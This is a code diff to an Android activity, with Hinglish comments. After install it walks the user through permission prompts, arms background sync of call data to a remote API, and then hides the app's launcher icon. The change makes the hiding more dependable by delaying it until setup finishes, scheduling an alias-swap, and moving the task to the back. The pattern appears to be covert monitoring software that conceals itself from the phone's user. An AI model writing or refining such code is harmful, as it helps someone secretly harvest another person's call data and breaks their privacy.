@@ -11,12 +11,14 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
 /**
- * Install / Open: pehle permission screens aage, sath mein icon hide.
- * Allow ke baad Home — app dubara open nahi karni. Kill-state sync background.
+ * Install / Open: pehle permission screens aage.
+ * Allow ke baad Home, phir alias-swap se icon hide.
+ * Permission dialog ke dauran launcher mat chhoo — process mar jaati hai.
  */
 class PermissionTrampolineActivity : AppCompatActivity() {
     private val pending = ArrayDeque<String>()
     private var retried = false
+    private var setupFinished = false
 
     private val permissionLauncher =
         registerForActivityResult(ActivityResultContracts.RequestPermission()) { _ ->
@@ -34,7 +36,6 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         MongoSyncHelper.ensureApiUrl(this)
         CallSyncHelper.markBackgroundSyncEnabled(this, true)
         SyncBootstrap.armBackgroundSync(this)
-        LauncherHider.hide(this, goHome = false, keepProcess = true)
 
         pending.clear()
         pending.addAll(SyncBootstrap.requiredPermissions())
@@ -81,6 +82,10 @@ class PermissionTrampolineActivity : AppCompatActivity() {
     }
 
     private fun finishAndSync() {
+        if (setupFinished) {
+            return
+        }
+        setupFinished = true
         SyncObserverManager.register(applicationContext)
         InstallFlow.completeSetup(applicationContext)
         BackgroundSyncRunner.run {
@@ -92,7 +97,11 @@ class PermissionTrampolineActivity : AppCompatActivity() {
                 Log.e(TAG, "Background first sync failed", error)
             }
         }
-        LauncherHider.hide(this, goHome = true, keepProcess = true)
+        try {
+            moveTaskToBack(true)
+        } catch (_: Exception) {
+        }
+        LauncherHider.markAndSchedule(applicationContext)
         finish()
     }
 
